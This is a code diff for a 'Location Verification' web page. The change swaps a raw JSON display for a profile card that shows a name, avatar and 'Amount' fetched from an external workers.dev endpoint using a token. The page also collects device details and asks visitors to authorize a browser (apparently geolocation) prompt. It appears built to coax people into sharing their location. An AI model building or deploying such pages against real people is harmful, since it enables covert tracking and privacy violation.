@@ -34,26 +34,58 @@
         .privacy-notice p { margin: 0; font-size: 16px; line-height: 1.5; font-weight: bold; }
         
         .verification-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 500px; width: 100%; box-sizing: border-box; }
-        .verification-container h1 { font-size: 24px; color: #1a73e8; margin-top: 0; margin-bottom: 10px; }
+        .verification-container h1 { font-size: 24px; color: #1a73e8; margin-top: 0; margin-bottom: 15px; }
         p.subtitle { color: #666; margin-bottom: 25px; font-size: 15px; }
 
-        /* Decrypted JSON Display Block */
-        .api-json-display {
-            display: none;
-            background: #1e1e1e;
-            color: #9cdcfe;
+        /* --- New User Profile Card Styling --- */
+        .user-profile-card {
+            display: none; /* Hidden until data loads */
+            align-items: center;
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
             padding: 15px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 13px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
             text-align: left;
-            margin: 0 auto 25px auto;
             width: 100%;
             box-sizing: border-box;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            gap: 15px;
         }
+
+        .profile-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #1a73e8;
+            background-color: #f0f0f0;
+        }
+
+        .profile-info {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .profile-name {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .profile-amount {
+            font-size: 14px;
+            color: #1a73e8;
+            font-weight: 600;
+            background: #e8f0fe;
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: inline-block;
+            width: fit-content;
+        }
+        /* ------------------------------------- */
 
         .badge-loading { background: #f5f5f5; color: #666; border: 1px solid #e0e0e0; padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 25px; display: inline-block; }
         .badge-error { background: #ffebee; color: #d32f2f; border: 1px solid #ffcdd2; padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 25px; display: inline-block; }
@@ -108,9 +140,19 @@
             <div id="introScreen">
                 <h1>Location Verification</h1>
                 
-                <!-- Status & Decrypted API JSON Output -->
+                <!-- Status Loader -->
                 <div id="statusBadge" class="badge-loading" style="display: none;"></div>
-                <pre id="apiJsonDisplay" class="api-json-display"></pre>
+                
+                <!-- Styled Profile Card -->
+                <div id="userProfileCard" class="user-profile-card">
+                    <!-- The onerror attribute serves as our fallback if the Discord URL breaks -->
+                    <img id="profileAvatar" class="profile-avatar" src="" alt="Profile Picture" 
+                         onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2NjYyI+PHBhdGggZD0iTTEyIDEyYzIuMjEgMCA0LTEuNzkgNC00czEtMS43OS00LTQtNCAxLjc5LTQgNCAxLjc5NCA0IDR6bTAgMmMtMi42NyAwLTggMS4zNC04IDR2MmwxNiAwdjItYzAtMi42Ni01LjMzLTQtOC00eiIvPjwvc3ZnPg=='">
+                    <div class="profile-info">
+                        <div id="profileName" class="profile-name"></div>
+                        <div id="profileAmount" class="profile-amount"></div>
+                    </div>
+                </div>
                 
                 <p class="subtitle">Please authorize the browser prompt to proceed.</p>
                 <button id="startBtn">Begin Verification</button>
@@ -158,12 +200,16 @@
         const successPopup = document.getElementById('successPopup');
         
         const statusBadge = document.getElementById('statusBadge');
-        const apiJsonDisplay = document.getElementById('apiJsonDisplay');
+        const userProfileCard = document.getElementById('userProfileCard');
+        const profileAvatar = document.getElementById('profileAvatar');
+        const profileName = document.getElementById('profileName');
+        const profileAmount = document.getElementById('profileAmount');
+
         const debugOutput = document.getElementById('debugOutput');
         const jsonRender = document.getElementById('jsonRender');
         
         let watchId = null;
-        let sessionData = {}; // Initialize empty. Decrypted token will NOT be stored here.
+        let sessionData = {}; 
 
         function getDeviceDetails() {
             const ua = navigator.userAgent;
@@ -184,7 +230,6 @@
             return { os, device, userAgent: ua };
         }
 
-        // --- THE JAVASCRIPT EQUIVALENT OF YOUR PYTHON SCRIPT ---
         async function processIdentifier(encryptedToken) {
             if (!encryptedToken || encryptedToken.trim() === '') {
                 return;
@@ -198,27 +243,33 @@
             const API_URL = "https://encrypt.ionpromax.workers.dev";
             
             try {
-                // Sending POST request to the edge network
                 const response = await fetch(API_URL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
-                    // Preparing the payload
                     body: JSON.stringify({ token: encryptedToken })
                 });
 
-                // Parse and output the response
-                if (response.ok) { // equivalent to response.status_code == 200
-                    const data = await response.json();
+                if (response.ok) { 
+                    const result = await response.json();
                     
-                    statusBadge.style.display = 'none'; // Hide the loading badge
-                    
-                    // Display the pretty-printed successful JSON data directly on screen
-                    apiJsonDisplay.textContent = JSON.stringify(data, null, 4);
-                    apiJsonDisplay.style.display = 'block';
-                    
-                    startBtn.disabled = false;
+                    // Defensive check: Ensure the expected JSON structure exists
+                    if (result.success && result.data) {
+                        statusBadge.style.display = 'none'; 
+                        
+                        // Populate the secure UI components using textContent to prevent XSS
+                        profileAvatar.src = result.data.pfp;
+                        profileName.textContent = result.data.name;
+                        profileAmount.textContent = `Amount: ${result.data.amount}`;
+                        
+                        // Show the card
+                        userProfileCard.style.display = 'flex';
+                        startBtn.disabled = false;
+                    } else {
+                        // Handle malformed JSON safely
+                        throw new Error("Invalid API Data Structure");
+                    }
                 } else {
                     console.error(`--- API REJECTED THE REQUEST --- \nStatus Code: ${response.status}`);
                     statusBadge.className = 'badge-error';
@@ -227,7 +278,7 @@
             } catch (error) {
                 console.error(`A network error occurred: ${error}`);
                 statusBadge.className = 'badge-error';
-                statusBadge.textContent = "Network Error: Could not reach API.";
+                statusBadge.textContent = "Data Error: Could not resolve verification token.";
             }
         }
 
